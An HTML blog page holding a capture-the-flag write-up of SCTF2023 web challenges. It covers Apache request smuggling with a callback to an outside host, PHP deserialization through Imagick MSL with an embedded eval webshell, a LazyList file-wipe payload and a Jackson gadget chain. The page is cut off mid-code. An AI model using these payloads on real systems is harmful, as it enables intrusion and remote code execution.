@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>SCTF2023 Web WriteUp - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="SCTF2023 Web WriteUp - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://boogipop.com/2023/06/20/SCTF2023%20Web%20WriteUp/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-06-20T01:40:00.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/WriteUp/">WriteUp</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>June</span>
+            <span>20,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">SCTF2023 Web WriteUp</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>特别鸣谢@m1sery@zwx风信子 三位共同作战的朋友</p>
+<p>战绩十分不错！</p>
+<h1 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h1><p>Apache 2.4.55 走私，签到题，但是U1S1我觉得很无语。<br><a target="_blank" rel="noopener" href="http://115.239.215.75:8082/2023/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/2022.php%3furl%3d114.116.119.253:7777%253fa%253d">http://115.239.215.75:8082/2023/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/2022.php%3furl%3d114.116.119.253:7777%253fa%253d</a><br>因为我并不知道是2022.php害我卡了好一会儿。需要注意的是走私的请求里的?&#x3D;需要做一下二次编码的处理<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147016671-5581c3d4-c306-4d74-a8f3-37eb88d00c81.png#averageHue=%23727170&clientId=u23785b68-07b0-4&from=paste&id=u8df46c6a&originHeight=695&originWidth=1638&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u5e406117-f193-4a24-8c65-52499e73f9f&title="></p>
+<h1 id="fumo-backdoor"><a href="#fumo-backdoor" class="headerlink" title="fumo_backdoor"></a>fumo_backdoor</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="keyword">__DIR__</span>.<span class="string">&quot;:/tmp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;FUNC_LIST&quot;</span>, <span class="title function_ invoke__">get_defined_functions</span>());</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fumo_backdoor</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$func</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$class</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      <span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;path) &amp;&amp; </span><br><span class="line">      <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[flag]/m&#x27;</span>, <span class="variable">$this</span>-&gt;path) === <span class="number">0</span></span><br><span class="line">    ) &#123;</span><br><span class="line">      <span class="title function_ invoke__">readfile</span>(<span class="variable">$this</span>-&gt;path);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;func;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      <span class="title function_ invoke__">is_string</span>(<span class="variable">$func</span>) &amp;&amp; </span><br><span class="line">      <span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, FUNC_LIST[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">      <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable">$argv</span> = <span class="variable language_">$this</span>-&gt;argv;</span><br><span class="line">      <span class="variable">$class</span> = <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">      <span class="title">new</span> $<span class="title">class</span>($<span class="title">argv</span>);</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">  &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">cmd</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">cmd</span>&#x27;];</span></span><br><span class="line"><span class="class">$<span class="title">data</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">data</span>&#x27;];</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">switch</span> ($<span class="title">cmd</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;unserialze&#x27;</span>:</span><br><span class="line">  <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;rm&#x27;</span>:</span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf /tmp 2&gt;/dev/null&quot;</span>);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看的这个<code>https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md</code>。<br>现在远程可以跑到_sleep里面，基本上就纯纯原题了。稍微改了点，include变为了readdir，因此我们很难getshell。那就改变思路了。首先我们知道flag是在根目录的，但是由于open_basedir我们并没有权限去读取，因此我们需要配合imagick的msl语言特性，把flag读到&#x2F;tmp目录下，然后再利用上述payload去触发__sleep，读取flag文件<br>首先我们需要用如下payload把flag移动到tmp目录下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;mvg:/flag&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;/tmp/xnythinx&quot;</span> /&gt;</span> #不能包含f l a g字母中的任何一个，那个正则识别的是4个字母</span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>mvg:对文件头似乎没有强制要求<br>这样可以把根目录下的 flag 文件移动到 &#x2F;tmp 中，配合__sleep 中的文件读取拿到 flag<br>然后就是按照上述github的原题去复现，首先我们需要写入一个session，可以配合ppm的文件格式在末尾插入一个脏数据。这里需要本地debug一下。<br>第一段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /?data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22aadsad%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D&amp;cmd=unserialze HTTP/1.1</span><br><span class="line">Host: 47.99.77.113:18080</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 702</span><br><span class="line">Content-Type: multipart/form-data; boundary=------------------------c32aaddf3d8fd979</span><br><span class="line"></span><br><span class="line">--------------------------c32aaddf3d8fd979</span><br><span class="line">Content-Disposition: form-data; name=&quot;swarm&quot;; filename=&quot;swarm.msl&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line"> &lt;read filename=&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czo5OiIvdG1wL3Nlc3MiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30=&quot; /&gt;</span><br><span class="line"> &lt;write filename=&quot;/tmp/sess_pop&quot; /&gt;</span><br><span class="line">&lt;/image&gt;</span><br><span class="line">--------------------------c32aaddf3d8fd979--</span><br></pre></td></tr></table></figure>
+<p>第二段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /?data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22aadsad%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D&amp;cmd=unserialze HTTP/1.1</span><br><span class="line">Host: 47.99.77.113:18080</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 320</span><br><span class="line">Content-Type: multipart/form-data; boundary=------------------------c32aaddf3d8fd979</span><br><span class="line"></span><br><span class="line">--------------------------c32aaddf3d8fd979</span><br><span class="line">Content-Disposition: form-data; name=&quot;swarm&quot;; filename=&quot;swarm.msl&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line">&lt;read filename=&quot;mvg:/flag&quot; /&gt;</span><br><span class="line">&lt;write filename=&quot;/tmp/sess&quot; /&gt;</span><br><span class="line">&lt;/image&gt;</span><br><span class="line">--------------------------c32aaddf3d8fd979--</span><br></pre></td></tr></table></figure>
+<p>然后携带PHPSESSID&#x3D;pop，去触发sleep，读取flag文件，yoooooooooooooo<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147016649-08cf54c4-0f9d-4bc2-af6f-177bf85f7990.png#averageHue=%23acacac&clientId=u23785b68-07b0-4&from=paste&id=u49f4b48e&originHeight=1032&originWidth=1640&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u3fbf59c2-66ba-4e00-bbfa-fab4fae237d&title="></p>
+<h1 id="Hellojava"><a href="#Hellojava" class="headerlink" title="Hellojava"></a>Hellojava</h1><p>绕过了那个Mybean的ifinput后可以清空黑名单<br>然后打一条jackson的链子<br>这一题的问题点就是怎么给那个input注入一个值，他jackson注解是标识了@jacksoninject，但是<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147016602-792ebfa6-951a-4e33-bdb6-7474c9b94b6e.png#averageHue=%23212322&clientId=u23785b68-07b0-4&from=paste&id=u1cce8b67&originHeight=327&originWidth=1816&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=uc2e474ad-55bc-4f4a-b33e-c4d8af7947f&title="><br>根据调试发现，我们注入的input值为空。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147016719-4f5f7fea-591e-4509-a9f0-637830e8ce34.png#averageHue=%232c2d2a&clientId=u23785b68-07b0-4&from=paste&id=ubd783c1f&originHeight=1012&originWidth=1879&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u31dc1d09-a0bc-496e-ae15-0e2fafa73a8&title="><br>名字获取的是’’因此，在我们注入的时候，需要用{&quot;&quot;:true,&quot;base64Code&quot;:&quot;AAAAAAAA&quot;}，这样方可避免报错，进入下一步骤。<br>然后就是审计依赖发现敏感依赖<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687147016659-86aa6036-0368-49ed-b301-1503959daab6.png#averageHue=%2330312e&clientId=u23785b68-07b0-4&from=paste&id=u19dea02e&originHeight=94&originWidth=497&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=uaab0fe0a-613a-4ff2-b7cf-77cb1a7841f&title="><br>然后scala里的lazylist是出过java反序列化漏洞的，我们可以利用exp清空任意文件的内容<br><a target="_blank" rel="noopener" href="https://github.com/yarocher/lazylist-cve-poc/blob/main/src/main/java/poc/cve/lazylist/payload/LazyList.java">https://github.com/yarocher/lazylist-cve-poc/blob/main/src/main/java/poc/cve/lazylist/payload/LazyList.java</a><br>按照上述github项目搭建好，就会生成一个序列化文件，把他base64后打入题目，就会清空黑名单</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXNyADZzY2FsYS5jb2xsZWN0aW9uLmltbXV0YWJsZS5MYXp5TGlzdCRTZXJpYWxpemF0aW9uUHJveHkAAAAAAAAAAwMAAHhwc3IAJnNjYWxhLnJ1bnRpbWUuTW9kdWxlU2VyaWFsaXphdGlvblByb3h5AAAAAAAAAAECAAFMAAttb2R1bGVDbGFzc3QAEUxqYXZhL2xhbmcvQ2xhc3M7eHB2cgAmc2NhbGEuY29sbGVjdGlvbi5nZW5lcmljLlNlcmlhbGl6ZUVuZCQAAAAAAAAAAwIAAHhwc3IAI3NjYWxhLmNvbGxlY3Rpb24uaW1tdXRhYmxlLkxhenlMaXN0AAAAAAAAAAMDAAVaAAhiaXRtYXAkMFoADW1pZEV2YWx1YXRpb25aADNzY2FsYSRjb2xsZWN0aW9uJGltbXV0YWJsZSRMYXp5TGlzdCQkc3RhdGVFdmFsdWF0ZWRMAAlsYXp5U3RhdGV0ABFMc2NhbGEvRnVuY3Rpb24wO0wAKnNjYWxhJGNvbGxlY3Rpb24kaW1tdXRhYmxlJExhenlMaXN0JCRzdGF0ZXQAK0xzY2FsYS9jb2xsZWN0aW9uL2ltbXV0YWJsZS9MYXp5TGlzdCRTdGF0ZTt4cAAAAXNyAExzY2FsYS5zeXMucHJvY2Vzcy5Qcm9jZXNzQnVpbGRlckltcGwkRmlsZU91dHB1dCQkYW5vbmZ1biQkbGVzc2luaXQkZ3JlYXRlciQzAAAAAAAAAAACAAJaAAhhcHBlbmQkMUwABmZpbGUkMnQADkxqYXZhL2lvL0ZpbGU7eHAAc3IADGphdmEuaW8uRmlsZQQtpEUODeT/AwABTAAEcGF0aHQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAAYLi9zZWN1cml0eS9ibGFja2xpc3QudHh0dwIAL3hzcQB+AAJ2cgAwc2NhbGEuY29sbGVjdGlvbi5pbW11dGFibGUuTGF6eUxpc3QkU3RhdGUkRW1wdHkkAAAAAAAAAAMCAAB4cHh4</span><br></pre></td></tr></table></figure>
+<p>然后使用jackson的普通利用链</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpHeaders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplChain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;caonima&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CTFLearning\\JackSonPOJO\\target\\classes\\org\\example\\b.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">11</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line">        <span class="comment">//deserial(serial(exp));</span></span><br><span class="line">        System.out.println(serial(exp));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doPOST</span><span class="params">(<span class="type">byte</span>[] obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">HttpHeaders</span> <span class="variable">requestHeaders</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpHeaders</span>();</span><br><span class="line">        requestHeaders.set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line">        <span class="type">URI</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;http://112.124.14.13:8080/bypassit&quot;</span>);</span><br><span class="line">        HttpEntity&lt;<span class="type">byte</span>[]&gt; requestEntity = <span class="keyword">new</span> <span class="title class_">HttpEntity</span> &lt;&gt; (obj,requestHeaders);</span><br><span class="line"></span><br><span class="line">        <span class="type">RestTemplate</span> <span class="variable">restTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);</span><br><span class="line">        System.out.println(res.getBody());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        